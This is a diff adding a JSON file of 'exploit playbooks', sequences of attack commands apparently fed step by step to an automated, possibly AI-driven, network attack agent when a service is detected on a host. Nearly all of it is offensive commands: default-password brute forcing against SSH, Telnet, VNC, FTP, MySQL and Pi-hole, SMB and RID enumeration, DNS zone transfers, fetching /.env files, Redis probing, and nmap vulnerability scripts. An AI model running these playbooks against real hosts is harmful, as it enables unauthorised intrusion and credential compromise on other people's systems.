@@ -1,0 +1,130 @@
+{
+  "_meta": {
+    "description": "Exploit playbooks — multi-step attack sequences triggered by host memory observations",
+    "usage": "When a trigger matches host memory, the steps are fed sequentially via multi-turn mode"
+  },
+  "playbooks": [
+    {
+      "id": "smb_share_read",
+      "trigger_obs": "shares accessible",
+      "trigger_ports": [445, 139],
+      "desc": "Read contents of accessible SMB shares",
+      "steps": [
+        "smbclient -N //{ip}/{share} -c 'recurse ON; ls'",
+        "impacket-samrdump {ip}",
+        "nxc smb {ip} -u '' -p '' --rid-brute"
+      ]
+    },
+    {
+      "id": "pihole_exploit",
+      "trigger_obs": "Pi-hole",
+      "trigger_ports": [80, 443],
+      "desc": "Exploit Pi-hole web interface",
+      "steps": [
+        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=admin'",
+        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=raspberry'",
+        "curl -s http://{ip}/admin/api.php?status",
+        "gobuster dir -u http://{ip}/admin -w /usr/share/wordlists/dirb/common.txt -q -t 5"
+      ]
+    },
+    {
+      "id": "dns_zone_transfer",
+      "trigger_obs": "DNS resolver",
+      "trigger_ports": [53],
+      "desc": "Attempt DNS zone transfer and enumerate",
+      "steps": [
+        "dig axfr @{ip}",
+        "dig @{ip} any",
+        "dig @{ip} -x 192.168.1.1"
+      ]
+    },
+    {
+      "id": "samba_deep",
+      "trigger_obs": "Samba version",
+      "trigger_ports": [445],
+      "desc": "Deep Samba enumeration after version detection",
+      "steps": [
+        "impacket-samrdump {ip}",
+        "impacket-rpcdump {ip}",
+        "nmap -T2 --script=smb-vuln-cve-2017-7494 -p 445 {ip}"
+      ]
+    },
+    {
+      "id": "http_deep",
+      "trigger_obs": "HTTP server",
+      "trigger_ports": [80, 8080, 8888, 443],
+      "desc": "Deep HTTP enumeration",
+      "steps": [
+        "curl -s http://{ip}/robots.txt",
+        "curl -s http://{ip}/.env",
+        "nikto -h http://{ip} -Tuning 1 -maxtime 60s",
+        "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -q -t 5"
+      ]
+    },
+    {
+      "id": "vnc_attack",
+      "trigger_obs": "VNC",
+      "trigger_ports": [5900, 5901],
+      "desc": "VNC password brute force",
+      "steps": [
+        "nxc vnc {ip} -p password",
+        "nxc vnc {ip} -p raspberry",
+        "nxc vnc {ip} -p admin",
+        "nmap -T2 --script=vnc-info,realvnc-auth-bypass -p 5900 {ip}"
+      ]
+    },
+    {
+      "id": "ssh_full_attack",
+      "trigger_obs": "SSH:",
+      "trigger_ports": [22],
+      "desc": "Full SSH credential attack",
+      "steps": [
+        "nxc ssh {ip} -u pi -p raspberry",
+        "nxc ssh {ip} -u root -p root",
+        "nxc ssh {ip} -u admin -p admin",
+        "nmap -T2 --script=ssh-auth-methods -p 22 {ip}"
+      ]
+    },
+    {
+      "id": "telnet_attack",
+      "trigger_obs": "telnet",
+      "trigger_ports": [23],
+      "desc": "Telnet default credentials",
+      "steps": [
+        "nxc telnet {ip} -u admin -p admin",
+        "nxc telnet {ip} -u root -p root",
+        "nxc telnet {ip} -u admin -p password"
+      ]
+    },
+    {
+      "id": "ftp_attack",
+      "trigger_obs": "ftp",
+      "trigger_ports": [21],
+      "desc": "FTP anonymous + default creds",
+      "steps": [
+        "nxc ftp {ip} -u anonymous -p anonymous",
+        "nmap -T2 --script=ftp-anon,ftp-vsftpd-backdoor -p 21 {ip}"
+      ]
+    },
+    {
+      "id": "redis_attack",
+      "trigger_obs": "redis",
+      "trigger_ports": [6379],
+      "desc": "Redis unauthenticated access",
+      "steps": [
+        "redis-cli -h {ip} INFO",
+        "redis-cli -h {ip} CONFIG GET dir"
+      ]
+    },
+    {
+      "id": "mysql_attack",
+      "trigger_obs": "mysql",
+      "trigger_ports": [3306],
+      "desc": "MySQL default creds",
+      "steps": [
+        "nxc mysql {ip} -u root -p root",
+        "nxc mysql {ip} -u root -p ''"
+      ]
+    }
+  ]
+}
